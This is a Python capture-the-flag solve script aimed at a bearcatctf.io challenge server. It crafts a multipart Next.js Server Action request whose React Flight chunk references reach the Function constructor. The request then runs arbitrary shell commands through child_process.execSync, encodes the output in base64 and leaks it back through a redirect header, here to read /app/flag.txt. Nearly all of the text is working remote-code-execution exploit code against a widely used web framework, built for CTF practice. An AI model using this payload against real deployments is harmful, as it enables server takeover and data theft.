#!/usr/bin/env python3
"""Get the flag from /app/flag.txt"""
import requests
import re
import json
import base64
from urllib.parse import unquote
from collections import OrderedDict

URL = "http://chal.bearcatctf.io:38270/"

def make_multipart(entries, boundary="----exploit"):
    parts = []
    for name, value in entries.items():
        parts.append(f'------exploit\r\nContent-Disposition: form-data; name="{name}"\r\n\r\n{value}')
    parts.append('------exploit--\r\n')
    return '\r\n'.join(parts)

def rce(command, label="rce"):
    code = (
        f"var res=process.mainModule.require('child_process')"
        f".execSync('{command}').toString().trim();"
        f"var encoded=Buffer.from(res).toString('base64');"
        f"throw Object.assign(new Error('NEXT_REDIRECT'),"
        f"{{digest:`NEXT_REDIRECT;push;/login?a=${{encoded}};307;`}});"
        f"//"
    )

    entries = OrderedDict()
    entries["4"] = '"anchor"'
    entries["5"] = '"$@4"'
    entries["6"] = json.dumps({
        "_fromJSON": "$5:_response:_fromJSON",
        "_prefix": code,
        "_formData": {"get": "$5:constructor:constructor"},
        "_chunks": "$5:_response:_chunks"
    })
    entries["0"] = json.dumps({
        "then": "$5:__proto__:then",
        "status": "resolved_model",
        "reason": -1,
        "value": '{"then":"$B0"}',
        "_response": "$6"
    })
    entries["1"] = '"$@0"'
    entries["2"] = "[]"

    headers = {
        "Next-Action": "x",
        "Accept": "text/x-component",
        "Content-Type": "multipart/form-data; boundary=----exploit",
        "Cookie": f"userId={label}",
    }
    body = make_multipart(entries)
    try:
        r = requests.post(URL, headers=headers, data=body.encode(), timeout=15, allow_redirects=False)
        redirect = r.headers.get("X-Action-Redirect", "")
        if redirect:
            m = re.search(r'/login\?a=([^;]+)', redirect)
            if m:
                output = base64.b64decode(unquote(m.group(1))).decode('utf-8')
                print(f"[{label}] {output}")
                return output
        print(f"[{label}] No redirect, status={r.status_code}")
        return None
    except requests.Timeout:
        print(f"[{label}] TIMEOUT")
        return None

# Get the flag!
rce("cat /app/flag.txt", "FLAG")
